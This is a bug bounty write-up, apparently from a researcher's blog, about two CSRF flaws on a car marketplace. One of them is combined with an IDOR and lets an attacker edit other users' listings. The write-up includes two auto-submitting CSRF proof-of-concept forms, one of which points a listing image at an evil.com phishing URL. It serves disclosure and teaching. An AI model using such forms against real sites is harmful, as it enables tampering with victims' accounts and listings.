---
title: "Multiple CSRF + IDOR — Car Marketplace Platform"
description: "Two CSRF vulnerabilities on a car marketplace — one allowed modifying other users' listings (CSRF + IDOR), the other silently added cars to a victim's saved list."
date: 2025-07-17
categories: [Writeups]
tags: [bugbounty, csrf, idor, web]
author: MOZA
toc: true
platform: "HackerOne"
---

## Summary

| Detail | Value |
|--------|-------|
| **Target** | Car marketplace platform |
| **Weakness** | CSRF + IDOR |
| **Reports** | 2 separate findings |
| **Status** | Triaged |
| **Platform** | HackerOne |

## The Story

While testing a car marketplace platform, I noticed the endpoints for managing car listings had no CSRF protection at all. No tokens, no SameSite cookies, no origin validation — nothing.

I found two separate attack vectors, both exploitable with a simple HTML page.

## Vulnerability 1 — Modify Other Users' Car Listings

This one was a CSRF combined with an IDOR. The endpoint for editing car listings accepted a `carId` parameter, but **never verified that the authenticated user actually owned that car**.

An attacker could:
1. Create their own listing and note the `carId`
2. Craft a CSRF form targeting **another user's** `carId`
3. Send the page to the victim
4. When the victim visits the page while logged in, their listing gets silently modified

```html
<form action="https://marketplace.example.com/members/editCar.asp?carId=552&mode=edit" method="POST">
  <input type="hidden" name="carType" value="C" />
  <input type="hidden" name="model" value="MODIFIED BY ATTACKER" />
  <input type="hidden" name="purchasePrice" value="1" />
  <input type="hidden" name="picURL" value="https://evil.com/phishing.jpg" />
  <input type="hidden" name="action" value="edit" />
</form>
<script>document.forms[0].submit();</script>
```

The attacker could change the price, description, images — everything. The `picURL` field was particularly dangerous since it allowed injecting external images for phishing or brand abuse.

### Vendor Response

> *"Thank you for your report! I was able to replicate this CSRF and validate it."*

## Vulnerability 2 — Add Cars to Victim's Saved List

The second CSRF was on a different subdomain of the same platform. The endpoint for saving a car listing had **no CSRF protection**.

```html
<form action="https://marketplace.example.co.uk/Cars/inventorylisting/saveShoppedListing.action" method="POST">
  <input type="hidden" name="inventoryListingId" value="156311477" />
  <input type="hidden" name="platform" value="DESKTOP" />
</form>
<script>document.forms[0].submit();</script>
```

When the victim opens this page, a car gets silently added to their saved list.

### Vendor Response

> *"I was able to replicate this CSRF and validate it. I'll pass this onto the team."*

## Impact

- **Full listing manipulation** — change prices, descriptions, images of any user's car listing
- **Phishing via image injection** — inject malicious images through the `picURL` field
- **Saved list manipulation** — fill victim's saved list with arbitrary listings
- **Data integrity** — undermines trust in the marketplace platform
- **Social engineering** — combined with phishing, could trick users into scams

## Timeline

| Date | Event |
|------|-------|
| 2025-07-17 | CSRF + IDOR report submitted (car listing modification) |
| 2025-09-25 | Triaged + bounty awarded |
| 2025-10-18 | Second CSRF report submitted (saved list) |
| 2025-10-29 | Validated + bounty awarded |

## Takeaways

1. **Check every state-changing endpoint for CSRF** — if you find one missing, check them all
2. **CSRF + IDOR is a powerful combo** — CSRF alone might be medium severity, but combined with IDOR it becomes high impact
3. **Test across subdomains** — the same vulnerability pattern often exists on different subdomains of the same platform
4. **Don't stop after the first find** — the second report on the same platform earned another bounty
